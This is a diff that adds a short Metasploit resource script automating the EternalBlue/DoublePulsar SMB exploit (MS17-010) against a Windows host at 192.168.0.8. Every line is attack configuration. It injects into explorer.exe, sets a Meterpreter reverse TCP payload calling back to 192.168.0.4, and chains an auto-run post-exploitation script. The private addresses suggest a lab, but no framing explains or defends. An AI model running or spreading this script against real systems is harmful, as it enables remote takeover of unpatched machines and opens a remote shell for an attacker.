@@ -1,0 +1,12 @@
+spool /root/automate/ms17_010/exploit3.txt
+use exploit/windows/smb/eternalblue_doublepulsar
+set rhost 192.168.0.8 
+set targetarchitecture x64
+set processinject explorer.exe
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.0.4
+set AutoRunScript multi_console_command -r /root/automate/ms17_010/autometerpreter.rc
+exploit -j
+sleep 100s
+exit
+spool off
